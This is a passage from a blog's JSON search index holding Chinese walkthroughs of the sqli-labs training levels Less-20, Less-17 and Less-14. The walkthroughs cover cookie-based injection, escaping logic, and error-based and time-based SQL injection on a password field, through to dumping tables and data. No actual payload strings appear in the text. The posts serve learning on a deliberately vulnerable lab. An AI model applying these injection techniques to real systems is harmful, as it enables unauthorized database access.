复写+联合注入就解决了","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs20","slug":"sql-labs20","date":"2018-07-08T12:17:00.000Z","updated":"2018-07-09T13:33:44.948Z","comments":true,"path":"/posts/47662/","link":"","permalink":"https://Foxgrin.github.io/posts/47662/","excerpt":"sql-labs20通关记录","text":"sql-labs20通关记录 Less-20今天的靶场是Less-20,这关涉及cookie,要深入理解的话我们就一行行分析源代码 首先，来到程序的第一个分支点，$_COOKIE这个变量是能获取到报文头部所包含的cookie字段其中的信息，我们可以分析出如果要执行这个if语句，则cookie的’uname’字段中是没有信息的。 那么网页首先显示的是跟前几个关卡相似的登录页面。接下来来到第一个分支点里的又一个分支点 可以看出当我们在网页中的表单中提交用户名和账号信息时，则开始执行这个if语句 就开始查询数据库里的用户名和密码信息 并且将查询结果的’username’字段中的用户名信息赋值给$cookee 如果查询结果不为空 则设置将cookie中设置名为’uname’的字段，并给该字段赋值$cookee变量的值，也就是之前查询到的用户名信息，并且设置该字段的生存时间如果查询结果为空，则返回一个查询失败的信息 也就是说当我们在网页的表单中输入用户名和密码时，当查询结果不为空时，则在cookie中设置字段值我们用burp抓包看看报文的详细信息 我们先查询一下users表里的信息 接着输入一个users表中存在的用户名和密码 这是我们提交表单给服务器的POST报文，来看看服务器这时返回的信息是什么 可以看出服务器设置了cookie信息 并且返回这些信息，可见这就是一开始的登录页面加上 查询结果后返回的信息那么我们放行这个请求报文，看看接下来发生什么 放行后出现了第二个请求报文，这是个GET请求报文，我们可以看出此时头部已经有了cookie信息，我们再来看看服务器的回应 我们再回头看看源代码，发现此时执行了第二个节点，此时cookie中的’uname’字段已经有了信息，则执行了else语句这个else语句中又包含了一个节点 也就是当我们还未点击submit按钮时会执行这个if语句 然后 返回一些信息 并且以cookee变量的值作为用户名进行数据库的查询然后将查询到的信息输出出来，最后一行会出现一个submit按钮接下来我们放行第二个报文 放行后可以看到网页发生了变化，也就是返回了还未提交submit时的信息我们点击一下submit按钮，这时看看请求的报文格式 可以看出这是一个POST请求报文，这时还又cookie信息，我们再来看看服务器返回的报文 这时服务器发现cookie中的’expires’字段中的时间发生了变化，’uname’字段内容为空时，默认内容为deleted，并且返回 可见当我们点击submit按钮后执行了else语句 放行这个POST请求报文 又出现了一个GET请求报文，看出此时cookie信息已经被删除了 又回到了一开始的登录界面这里就涉及了一个重定向“location”它的作用是不用用户输入网址，它会自动访问，一般是GET请求，所以我们之前能抓到两个请求报文，且网页最后显示是重定向后的最终页面","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs17","slug":"sql-labs17","date":"2018-07-08T12:06:00.000Z","updated":"2018-07-09T13:33:44.947Z","comments":true,"path":"/posts/34927/","link":"","permalink":"https://Foxgrin.github.io/posts/34927/","excerpt":"sql-labs17通关记录","text":"sql-labs17通关记录 Less-17 首先了解到本关是可以改密码，看一下源代码 同样是接收我们输入的username和password，但是这里定义了一个check_input函数 一步步分析这个函数 首先empty这个函数，如果输入值不为空，则返回是false，输入为空，返回true 我们输入的是一个字符串，判断为空的情况的字符串为“”和“0”，所以要执行if语句，则empty返回false，所以输入字符串不为“”和“0”时，截取字符串前十五位 这两个if语句就起到了对输入特殊字符的转义的作用，get_magic_quotes_gpc()这个函数当系统有对特定字符转义时返回true，没有返回false，当有转义时，执行if语句，stripslashes()函数将转义字符丢弃，ctype_digit()函数判断当字符串值不为0或者正整数时返回false，则会将输入的字符串加上’’并且对特殊字符转义 我们首先先输入两个admin，可以看到提示修改密码成功，再看一下result.txt里面输入的值 可以发现我们输入admin这个字符串两边被加了单引号，我们试试用户名admin’ 提示错误，说明查询结果为空，从txt文件可以看到 对我们输入的’进行了转义，说明username无法进行一个注入，我们再试着在用户名输入0 发现修改成功 从txt文件 看出输入字符串为0所以没有加单引号所以这题的注入点应该是password，我们先试试 果然出现了报错信息 没有报错，说明password被单引号包裹,我们来试试基于报错型的注入 结果显示 再试试基于时间的报错型注入 按理来说应该会sleep 13秒，因为没有指定修改条件，会一行行的修改，而users表里有十三行，所以修改十三次。 但从结果来看并没有sleep 这是为什么呢，这个问题我也想了好久好久，最终学长点醒了我，原来是and的优先级大于=，所以先执行’admin’ and if()语句，而字符串里没有数字时是无法做and运算的，就无法执行后面的if语句 我们试着把密码加一个数字 果然结果sleep了13秒，学长建议通过where后的条件进行注入以免意外的错误 于是我们开始爆表名 爆列名 爆数据","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs14","slug":"sql-labs14","date":"2018-07-06T17:49:00.000Z","updated":"2018-07-10T10:04:16.839Z","comments":true,"path":"/posts/35119/","link":"","permalink":"https://Foxgrin.github.io/posts/35119/","excerpt":"以Less-14为例总结一下什么情况会报错或返回查询结果为空","text":"以Less-14为例总结一下什么情况会报错或返回查询结果为空 Less-14部分源代码： 今天总结一下什么情况下会报错，或者查询不到信息，靶场采取sql-labs-less14 可见明显有报错信息，改一下payload 发现这时候虽然登录失败，但是没有报错信息，原因是因为username被双引号包裹，而我们输入’#，系统会认为这个单引号是字符，而前面的双引号没有被闭合，所以一直没有查询结果，自然也不会报错 再改一下 发现没有报错信息，但是登录失败，原因是因为password=0这列不存在，所以查询结果为空，登录失败 再改一下 发现系统睡5秒后提示登录失败，也没有报错信息，发现虽然username虽然是存在的，但是因为系统睡了5秒，查询结果为空 所以，只要为空就一定会登录失败","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]}]}